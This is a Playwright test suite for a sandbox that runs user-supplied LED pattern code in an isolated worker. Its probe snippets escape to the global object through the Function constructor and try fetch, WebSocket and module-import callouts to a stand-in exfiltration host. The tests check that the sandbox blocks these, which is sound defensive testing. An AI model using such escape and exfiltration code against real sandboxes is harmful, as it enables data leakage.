import { test, expect } from '@playwright/test';
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
const bootstrapHash = createHash('sha256').update(readFileSync(new URL('../src/lib/pattern-isolation/bootstrap.js', import.meta.url))).digest('base64');
// Disposable contexts only; no real secrets or network.
test.use({ serviceWorkers: 'allow' });
const csp = `default-src 'self'; script-src 'self' 'unsafe-eval' 'sha256-${bootstrapHash}'; worker-src 'self' blob:; object-src 'none'; base-uri 'none'`;
test.beforeEach(async ({ page }) => {
  await page.route('**/isolation-harness', route => route.fulfill({ body: '<!doctype html><title>Isolation test</title>', contentType: 'text/html', headers: { 'Content-Security-Policy': csp } }));
  await page.goto('/isolation-harness');
});
test('opaque worker preserves RGB without page capabilities or Math mutation', async ({ page }) => {
  const requests: string[] = [];
  await page.route('**/synthetic-exfil.invalid/**', route => { requests.push(route.request().url()); return route.abort(); });
  const result = await page.evaluate(async () => {
    const { createPatternFrameService } = await import('/src/lib/patternFrameIsolation.js');
    (window as any).__patternCanary = 173; localStorage.setItem('__patternCanary', '173'); document.cookie = '__patternCanary=173';
    const service = createPatternFrameService();
    const args = [0, .2, .4, 1, .5, 1, [], 0, 0, {}, 0, 0];
    const run = async (code: string) => Array.from(await service.render({ sources: [code], samples: [{ source: 0, args }] }));
    const ordinary = await run('return [x, y, 1];');
    const capabilities = await run(`const g = (() => {})['con' + 'structor']('return this')();
      g.Math.__patternMutation = 173;
      let storage = false; try { storage = !!g.localStorage; } catch {}
      try { g.fetch('https://synthetic-exfil.invalid/fetch').catch(() => {}); } catch {}
      try { new g.WebSocket('wss://synthetic-exfil.invalid/socket'); } catch {}
      try { g.Function('return im'+'port("https://synthetic-exfil.invalid/module.js")')().catch(() => {}); } catch {}
      return [g.__patternCanary || 0, storage ? 173 : 0, (typeof g.document === 'undefined' && typeof g.Worker === 'undefined' && typeof g.importScripts === 'undefined') ? 255 : 0];`);
    service.dispose();
    return { ordinary, capabilities, mutation: (Math as any).__patternMutation, frames: document.querySelectorAll('iframe[data-pattern-isolation]').length };
  });
  expect(result).toEqual({ ordinary: [51, 102, 255], capabilities: [0, 0, 255], mutation: undefined, frames: 0 }); expect(requests).toEqual([]);
});
test('loop deadline keeps timers responsive and good replacement recovers', async ({ page }) => {
  const result = await page.evaluate(async () => {
    const { createPatternFrameService } = await import('/src/lib/patternFrameIsolation.js');
    const service = createPatternFrameService({ deadlineMs: 150 });
    const job = (code: string) => ({ sources: [code], samples: [{ source: 0, args: [0] }] });
    await service.render(job('return [1, 0, 0];'));
    let ticks = 0; const timer = setInterval(() => ticks++, 10); const start = performance.now();
    const error = await service.render(job('while (true) {}')).then(() => '', e => e.message);
    const elapsed = performance.now() - start;
    const recovery = Array.from(await service.render(job('return [0, 1, 0];')));
    clearInterval(timer); service.dispose(); return { error, elapsed, ticks, recovery };
  });
  expect(result.error).toContain('deadline'); expect(result.elapsed).toBeLessThan(1500); expect(result.ticks).toBeGreaterThan(4); expect(result.recovery).toEqual([0, 255, 0]);
});
test('oversized jobs and disposal fail closed', async ({ page }) => {
  const result = await page.evaluate(async () => {
    const { createPatternFrameService } = await import('/src/lib/patternFrameIsolation.js'); const service = createPatternFrameService();
    const oversized = await service.render({ sources: ['return 0;'], samples: Array(32001).fill({ source: 0, args: [] }) }).then(() => '', e => e.message);
    const pending = service.render({ sources: ['while(true){}'], samples: [{ source: 0, args: [] }] }).then(() => '', e => e.message); service.dispose();
    return { oversized, pending: await pending, frames: document.querySelectorAll('iframe[data-pattern-isolation]').length };
  });
  expect(result.oversized).toContain('budget'); expect(result.pending).toContain('disposed'); expect(result.frames).toBe(0);
});

test('isolated frame adapter matches bundled patterns, blending, symmetry and modifiers', async ({ page }) => {
  const result = await page.evaluate(async () => {
    const { createPatternFrameService } = await import('/src/lib/patternFrameIsolation.js');
    const { renderIsolatedPixelFrame } = await import('/src/lib/isolatedFrameEngine.js');
    const { renderPixelFrame, buildGammaLut } = await import('/src/lib/frameEngine.js');
    const { listBuiltInPatterns } = await import('/src/lib/patternRegistry.js');
    const service = createPatternFrameService();
    const strips = [{ id: 'test', pts: Array.from({ length: 19 }, (_, i) => ({ x: i / 18, y: .5, p: i / 18, reflectionProgress: 1 - i / 18, kaleidoscopeProgress: i / 18 })) }];
    const mismatches = [];
    for (const pattern of listBuiltInPatterns()) {
      const options = { strips, t: 1.234, patternId: pattern.id, blendPatternId: 'aurora', blendAmount: .3, masterBrightness: .8, masterHueShift: 23, masterSaturation: .7, gammaLUT: buildGammaLut(true), symSettings: { enabled: true, type: 'mirror-hv' } };
      const baseline = renderPixelFrame(options);
      const isolated = await renderIsolatedPixelFrame(options, service);
      if (JSON.stringify(baseline) !== JSON.stringify(isolated)) mismatches.push(pattern.id);
    }
    service.dispose(); return { mismatches, count: listBuiltInPatterns().length };
  });
  expect(result.count).toBeGreaterThan(10); expect(result.mismatches).toEqual([]);
});

test('frame cost is measured at 1024 samples and 8000 output pixels', async ({ page }, testInfo) => {
  const measurements = await page.evaluate(async () => {
    const { createPatternFrameService } = await import('/src/lib/patternFrameIsolation.js');
    const { renderIsolatedPixelFrame } = await import('/src/lib/isolatedFrameEngine.js');
    const { renderPixelFrame } = await import('/src/lib/frameEngine.js');
    const results = [];
    for (const count of [1024, 8000]) {
      const service = createPatternFrameService();
      const options = { patternId: 'aurora', t: 1.234, strips: [{ id: 'measure', pts: Array.from({ length: count }, (_, i) => ({ x: i / count, y: .5, p: i / count })) }] };
      await renderIsolatedPixelFrame(options, service);
      const baseline = [], isolated = [], longTasks = [];
      const observer = PerformanceObserver.supportedEntryTypes.includes('longtask')
        ? new PerformanceObserver(list => longTasks.push(...list.getEntries().map(entry => entry.duration))) : null;
      observer?.observe({ type: 'longtask' });
      const heapBefore = (performance as any).memory?.usedJSHeapSize ?? null;
      for (let i = 0; i < 20; i++) {
        let start = performance.now(); renderPixelFrame(options); baseline.push(performance.now() - start);
        start = performance.now(); await renderIsolatedPixelFrame(options, service); isolated.push(performance.now() - start);
      }
      const stats = (values: number[]) => { values.sort((a,b)=>a-b); return { p50: values[10], p95: values[18] }; };
      const fpsStart = performance.now();
      for (let i = 0; i < 10; i++) { await new Promise(requestAnimationFrame); await renderIsolatedPixelFrame(options, service); }
      const deliveredFps = 10000 / (performance.now() - fpsStart);
      await new Promise(resolve => setTimeout(resolve, 0)); observer?.disconnect();
      results.push({ count, baseline: stats(baseline), isolated: stats(isolated), visibility: document.visibilityState,
        deliveredFps, mainLongTasksMs: observer ? longTasks : null,
        heapBefore, heapAfter: (performance as any).memory?.usedJSHeapSize ?? null }); service.dispose();
    }
    return results;
  });
  await testInfo.attach('frame-performance.json', { body: JSON.stringify(measurements, null, 2), contentType: 'application/json' });
  console.log('ISOLATED_FRAME_PERFORMANCE', JSON.stringify(measurements));
  expect(measurements).toHaveLength(2);
});

test('reachable PatternPreview isolates registry sources and displays failure without native fallback', async ({ page }) => {
  await page.evaluate(async () => {
    const refresh = await import('/@react-refresh'); refresh.default.injectIntoGlobalHook(window);
    (window as any).$RefreshReg$ = () => {}; (window as any).$RefreshSig$ = () => (type: any) => type; (window as any).__vite_plugin_react_preamble_installed__ = true;
    const reactModule = await import('/node_modules/.vite/deps/react.js'); const React = reactModule.default || reactModule;
    const client = await import('/node_modules/.vite/deps/react-dom_client.js');
    const { PatternPreview } = await import('/src/v3/PatternPreview.jsx');
    const { saveCustomPattern } = await import('/src/lib/customPatterns.js');
    saveCustomPattern({ id: 'custom_canvas_probe', name: 'Synthetic', code: `const g = (()=>{})['con'+'structor']('return this')(); g.Math.__canvasCanary = 173; return [g.__canvasCanary || 0, 255, 0];` });
    saveCustomPattern({ id: 'custom_canvas_loop', name: 'Synthetic loop', code: 'while(true){}' });
    (window as any).__canvasCanary = 173;
    const host = document.createElement('div'); host.style.cssText = 'width:400px;height:150px'; document.body.append(host);
    const root = (client.createRoot || client.default.createRoot)(host);
    (window as any).__renderCanvas = (patternId: string) => root.render(React.createElement(PatternPreview, { patternId, playing: true, compactRibbon: true, onFrame: (pixels: any) => (window as any).__lastCanvasPixels = pixels,
      strips: [{ id: 'sample', pts: [{ x: 0, y: 0, p: 0 }, { x: 1, y: 0, p: 1 }] }] }));
    (window as any).__renderCanvas('custom_canvas_probe');
  });
  await expect.poll(() => page.evaluate(() => (window as any).__lastCanvasPixels?.[0])).toEqual({ r: 0, g: 255, b: 0 });
  expect(await page.evaluate(() => (Math as any).__canvasCanary)).toBeUndefined();
  await page.evaluate(() => (window as any).__renderCanvas('custom_canvas_loop'));
  await expect(page.getByRole('status')).toContainText('Pattern preview stopped');
  await page.evaluate(() => (window as any).__renderCanvas('custom_canvas_probe'));
  await expect(page.getByRole('status')).toHaveCount(0);
  await page.screenshot({ path: '/private/tmp/lightweaver-isolated-canvas.png' });
});


test('offline Chromium renders and unsupported WebKit rejects without fallback', async ({ page, context, browserName }) => {
  await page.evaluate(async () => { (window as any).__isolationModule = await import('/src/lib/patternFrameIsolation.js'); });
  await context.setOffline(true);
  const result = await page.evaluate(async () => {
    const service = (window as any).__isolationModule.createPatternFrameService();
    try { return { pixels: Array.from(await service.render({ sources: ['return [0, 0, 1];'], samples: [{ source: 0, args: [0] }] })) }; }
    catch (error) { return { error: error.message }; }
    finally { service.dispose(); }
  });
  // Measured platform limitation: this WebKit build stops delivering blob
  // worker jobs when Playwright goes offline. Preserve the rejection boundary;
  // this assertion is not a claim that offline WebKit rendering is supported.
  if (browserName === 'webkit') expect(result.error).toContain('deadline');
  else expect(result.pixels).toEqual([0, 0, 255]);
});

test('policy without bootstrap authorization fails closed', async ({ page }) => {
  await page.route('**/old-isolation-policy', route => route.fulfill({ body: '<!doctype html>', contentType: 'text/html', headers: { 'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-eval'; worker-src 'self' blob:" } }));
  await page.goto('/old-isolation-policy');
  const result = await page.evaluate(async () => {
    const { createPatternFrameService } = await import('/src/lib/patternFrameIsolation.js');
    const service = createPatternFrameService({ startupMs: 100 });
    try { return await service.render({ sources: ['return [1,0,0];'], samples: [{ source: 0, args: [0] }] }).then(() => 'unsafe fallback', e => e.message); }
    finally { service.dispose(); }
  });
  expect(result).toContain('startup deadline');
});


test('worker stale and oversized buffer replies cannot pass the frame boundary', async ({ page }) => {
  const result = await page.evaluate(async () => {
    const { createPatternFrameService } = await import('/src/lib/patternFrameIsolation.js');
    const service = createPatternFrameService();
    try {
      return Array.from(await service.render({ sources: [`const g = (()=>{})['con'+'structor']('return this')();
        g.postMessage({id: 999, pixels: new Uint8Array([173, 0, 0])});
        g.postMessage({id: 1, pixels: new Uint8Array(new ArrayBuffer(200000), 0, 3)});
        return [0, 0, 1];`], samples: [{ source: 0, args: [0] }] }));
    } finally { service.dispose(); }
  });
  expect(result).toEqual([0, 0, 255]);
});

test('custom syntax and per-strip reflection, phases, blends and mirrors keep exact RGB order', async ({ page }) => {
  const mismatches = await page.evaluate(async () => {
    const { createPatternFrameService } = await import('/src/lib/patternFrameIsolation.js');
    const { renderIsolatedPixelFrame } = await import('/src/lib/isolatedFrameEngine.js');
    const { renderPixelFrame, compilePattern, normalizePalette } = await import('/src/lib/frameEngine.js');
    const { saveCustomPattern } = await import('/src/lib/customPatterns.js');
    saveCustomPattern({ id: 'custom_compatibility', name: 'Synthetic compatibility', code: `// @param amount 0.5 0 1 0.1
      const c = samplePalette(reflectionProgress); let total = 0;
      for (let j = 0; j < 3; j++) total += j;
      return {r: c.r * params.amount, g: (index + total) * 3, b: stripProgress * 255};` });
    const strips = ['a','b'].map((id, stripIndex) => ({ id, patternId: stripIndex ? 'gradient' : 'custom_compatibility', brightness: .7,
      pts: Array.from({ length: 7 }, (_, i) => ({ x: i / 6, y: stripIndex, p: i / 6, reflectionProgress: 1 - i / 6 })) }));
    const service = createPatternFrameService(); const mismatches = [];
    for (const blendType of ['crossfade', 'fade-black', 'dissolve']) {
      const options = { strips, patternId: 'custom_compatibility', t: 2.3, params: { amount: .4 },
        patternParamsById: { gradient: { amount: .3 } }, paletteNorm: normalizePalette(['#ff00ff','#0011ff']),
        stripPhases: new Map([['a',1.1],['b',.4]]), blendPatternId: 'aurora', blendAmount: .7, blendType,
        symmetry: { sides: [{ id: 'lead', stripIds: ['a'] }, { id: 'twin', stripIds: ['b'] }] }, sidesMirrored: true };
      const baseline = renderPixelFrame({ ...options, perStripFns: new Map(strips.map(strip => [strip.patternId, compilePattern(strip.patternId)])) });
      const isolated = await renderIsolatedPixelFrame(options, service);
      if (JSON.stringify(baseline) !== JSON.stringify(isolated)) mismatches.push(blendType);
    }
    service.dispose(); return mismatches;
  });
  expect(mismatches).toEqual([]);
});
